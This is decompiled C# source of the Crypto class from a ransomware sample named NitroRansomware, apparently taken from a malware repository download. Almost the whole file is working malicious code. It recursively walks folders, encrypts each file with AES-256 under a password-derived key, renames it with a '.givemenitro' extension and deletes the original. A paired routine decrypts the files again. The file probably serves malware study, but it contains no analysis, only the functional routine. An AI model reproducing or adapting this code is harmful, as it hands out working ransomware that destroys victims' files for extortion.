// Decompiled with JetBrains decompiler
// Type: NitroRansomware.Crypto
// Assembly: NitroRansomware, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BE95CECD-0A68-4BA9-9E14-B4A1304BC79B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.MSIL.Gen.gen-00a84b4d7c45a603efaf946f2422e8ce64ebb632473ec36c34c03a94739e745a.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace NitroRansomware
{
  internal class Crypto
  {
    public static int encryptedCount = 0;
    private static Logs logging = new Logs("DEBUG", 0);
    private static string fExtension = ".givemenitro";
    public static string fPassword = Program.DECRYPT_PASSWORD;
    public static string inPassword;
    public static List<string> encryptedFileLog = new List<string>();

    public static void EncryptContent(string path)
    {
      try
      {
        foreach (string file in Directory.GetFiles(path))
        {
          if (!file.Contains(Crypto.fExtension))
          {
            Crypto.logging.Debug("Encrypting: " + file);
            Crypto.encryptedFileLog.Add(file);
            Crypto.EncryptFile(file, Crypto.fPassword);
          }
        }
        foreach (string directory in Directory.GetDirectories(path))
          Crypto.EncryptContent(directory);
      }
      catch (Exception ex)
      {
        Crypto.logging.Error(ex.Message);
      }
    }

    public static void DecryptContent(string path)
    {
      try
      {
        foreach (string file in Directory.GetFiles(path))
        {
          if (Crypto.IsEncrypted(file))
          {
            Crypto.logging.Debug("Decrypting: " + file);
            Crypto.DecryptFile(file, file.Substring(0, file.Length - Crypto.fExtension.Length), Crypto.inPassword);
          }
        }
        foreach (string directory in Directory.GetDirectories(path))
          Crypto.DecryptContent(directory);
      }
      catch (Exception ex)
      {
        Crypto.logging.Error(ex.Message);
      }
    }

    private static bool IsEncrypted(string file) => file.Contains(Crypto.fExtension) && file.Substring(file.Length - Crypto.fExtension.Length, Crypto.fExtension.Length) == Crypto.fExtension;

    private static void EncryptFile(string filePath, string password)
    {
      byte[] numArray = new byte[32];
      RNGCryptoServiceProvider cryptoServiceProvider = new RNGCryptoServiceProvider();
      for (int index = 0; index < 10; ++index)
        cryptoServiceProvider.GetBytes(numArray);
      cryptoServiceProvider.Dispose();
      FileStream fileStream1 = new FileStream(filePath + Crypto.fExtension, FileMode.Create);
      byte[] bytes = Encoding.UTF8.GetBytes(password);
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      rijndaelManaged.KeySize = 256;
      rijndaelManaged.BlockSize = 128;
      rijndaelManaged.Padding = PaddingMode.PKCS7;
      byte[] salt = numArray;
      Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, salt, 50000);
      rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
      rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
      rijndaelManaged.Mode = CipherMode.CBC;
      fileStream1.Write(numArray, 0, numArray.Length);
      CryptoStream cryptoStream = new CryptoStream((Stream) fileStream1, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
      FileStream fileStream2 = new FileStream(filePath, FileMode.Open);
      byte[] buffer = new byte[1048576];
      try
      {
        int count;
        while ((count = fileStream2.Read(buffer, 0, buffer.Length)) > 0)
          cryptoStream.Write(buffer, 0, count);
        fileStream2.Close();
      }
      catch (Exception ex)
      {
        Crypto.logging.Error(ex.Message);
      }
      finally
      {
        Crypto.logging.Info("Encypted " + filePath);
        ++Crypto.encryptedCount;
        cryptoStream.Close();
        fileStream1.Close();
        File.Delete(filePath);
      }
    }

    private static void DecryptFile(string inputFile, string outputFile, string password)
    {
      byte[] bytes = Encoding.UTF8.GetBytes(password);
      byte[] buffer1 = new byte[32];
      FileStream fileStream1 = new FileStream(inputFile, FileMode.Open);
      fileStream1.Read(buffer1, 0, buffer1.Length);
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      rijndaelManaged.KeySize = 256;
      rijndaelManaged.BlockSize = 128;
      byte[] salt = buffer1;
      Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, salt, 50000);
      rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
      rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
      rijndaelManaged.Padding = PaddingMode.PKCS7;
      rijndaelManaged.Mode = CipherMode.CBC;
      CryptoStream cryptoStream = new CryptoStream((Stream) fileStream1, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
      FileStream fileStream2 = new FileStream(outputFile, FileMode.Create);
      byte[] buffer2 = new byte[1048576];
      try
      {
        int count;
        while ((count = cryptoStream.Read(buffer2, 0, buffer2.Length)) > 0)
          fileStream2.Write(buffer2, 0, count);
      }
      catch (CryptographicException ex)
      {
        Crypto.logging.Error("CryptographicException error: " + ex.Message);
      }
      catch (Exception ex)
      {
        Crypto.logging.Error(ex.Message);
      }
      try
      {
        cryptoStream.Close();
        Crypto.logging.Info("Decrypted: " + inputFile);
      }
      catch (Exception ex)
      {
        Crypto.logging.Error("Error by closing CryptoStream: " + ex.Message);
      }
      finally
      {
        fileStream2.Close();
        fileStream1.Close();
      }
    }
  }
}
